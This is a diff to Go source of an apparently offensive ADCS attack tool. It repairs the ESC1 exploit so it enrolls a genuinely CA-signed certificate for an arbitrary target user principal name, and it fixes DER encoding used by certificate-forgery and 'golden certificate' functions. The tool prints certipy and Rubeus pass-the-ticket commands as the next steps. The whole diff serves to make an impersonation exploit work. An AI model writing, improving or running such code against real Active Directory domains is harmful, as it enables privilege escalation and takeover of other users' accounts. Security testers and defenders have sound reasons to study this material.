@@ -275,12 +275,9 @@ func scoreESC(tmpl *CertTemplate) {
 		}
 	}
 
-	// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
-	// Detectable from template flags — flag value 0x00040000 in msPKI-Certificate-Name-Flag
-	if tmpl.CertificateNameFlag&0x00040000 != 0 {
-		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC6")
-		tmpl.ESCScore += 9
-	}
+	// ESC6 is a CA-level misconfiguration (EDITF_ATTRIBUTESUBJECTALTNAME2 in enrollment
+	// service flags), not a template attribute. Detected by ScanESC6() which queries
+	// pKIEnrollmentService objects. Template-level scoring cannot detect ESC6.
 
 	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — no szOID_NTDS_CA_SECURITY_EXT extension
 	// msPKI-Enrollment-Flag & 0x00080000 + authentication EKU required
@@ -408,18 +405,13 @@ func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	fmt.Printf("[*] Authentication EKU: %v\n", vulnTemplate.AuthenticationEKU)
 	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)
 
-	// Step 2: Generate signing key and forge certificate with target UPN
-	signingKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	// Step 2: Enroll for a CA-signed certificate with target UPN
+	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
 	if err != nil {
-		return nil, nil, fmt.Errorf("generate signing key: %w", err)
+		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
 	}
 
-	cert, certKey, err := ForgeCertificate(signingKey, targetUPN)
-	if err != nil {
-		return nil, nil, fmt.Errorf("forge cert: %w", err)
-	}
-
-	fmt.Printf("[+] Forged certificate for %s via ESC1 on template %q\n", targetUPN, templateName)
+	fmt.Printf("[+] Certificate obtained for %s via ESC1 on template %q\n", targetUPN, templateName)
 	fmt.Printf("[*] Next steps:\n")
 	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip %s\n", cfg.TargetDC)
 	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:cert.pfx /ptt\n", targetUPN)
@@ -588,27 +580,44 @@ func AutoDetectESC(cfg *ADCSConfig) ([]CertTemplate, error) {
 func upnOtherName(upn string) ([]byte, error) {
 	// OtherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY }
 	// The value for UPN is UTF8String.
-	upnOID := []int{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}
 
-	type otherName struct {
-		TypeID   interface{}
-		Value    interface{}
-	}
-	_ = otherName{}
-
-	// Manual DER encoding: SEQUENCE { OID, [0] { UTF8String } }
-	// OID bytes for 1.3.6.1.4.1.311.20.2.3
+	// OID bytes for 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME)
 	oidBytes := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03}
-	_ = upnOID
 
 	upnBytes := []byte(upn)
-	utf8Val := append([]byte{0x0c, byte(len(upnBytes))}, upnBytes...)
-	// [0] EXPLICIT wrapping
-	explicit0 := append([]byte{0xa0, byte(len(utf8Val))}, utf8Val...)
+	utf8Val := derTLV(0x0c, upnBytes)          // UTF8String
+	explicit0 := derTLV(0xa0, utf8Val)          // [0] EXPLICIT
 	inner := append(oidBytes, explicit0...)
-	// SEQUENCE wrapper
-	result := append([]byte{0x30, byte(len(inner))}, inner...)
+	result := derTLV(0x30, inner)               // SEQUENCE
 	return result, nil
+}
+
+// derTLV builds a DER tag-length-value encoding with proper multi-byte length
+// support for payloads exceeding 127 bytes.
+func derTLV(tag byte, value []byte) []byte {
+	n := len(value)
+	if n < 0x80 {
+		out := make([]byte, 2+n)
+		out[0] = tag
+		out[1] = byte(n)
+		copy(out[2:], value)
+		return out
+	}
+	if n < 0x100 {
+		out := make([]byte, 3+n)
+		out[0] = tag
+		out[1] = 0x81
+		out[2] = byte(n)
+		copy(out[3:], value)
+		return out
+	}
+	out := make([]byte, 4+n)
+	out[0] = tag
+	out[1] = 0x82
+	out[2] = byte(n >> 8)
+	out[3] = byte(n)
+	copy(out[4:], value)
+	return out
 }
 
 // ForgeCertificate generates a self-signed certificate with the given UPN and returns
@@ -638,7 +647,7 @@ func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, *
 		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
 	}
 	// SubjectAltName extension: SEQUENCE OF GeneralName, where GeneralName [0] = OtherName
-	sanRaw := append([]byte{0x30, byte(len(upnSAN))}, upnSAN...)
+	sanRaw := derTLV(0x30, upnSAN)
 
 	template := &x509.Certificate{
 		SerialNumber: big.NewInt(1337),
@@ -772,7 +781,7 @@ func ForgeGoldenCertificate(caKey crypto.PrivateKey, caCert *x509.Certificate, u
 	if err != nil {
 		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
 	}
-	sanRaw := append([]byte{0x30, byte(len(upnSAN))}, upnSAN...)
+	sanRaw := derTLV(0x30, upnSAN)
 
 	template := &x509.Certificate{
 		SerialNumber: serialNumber,
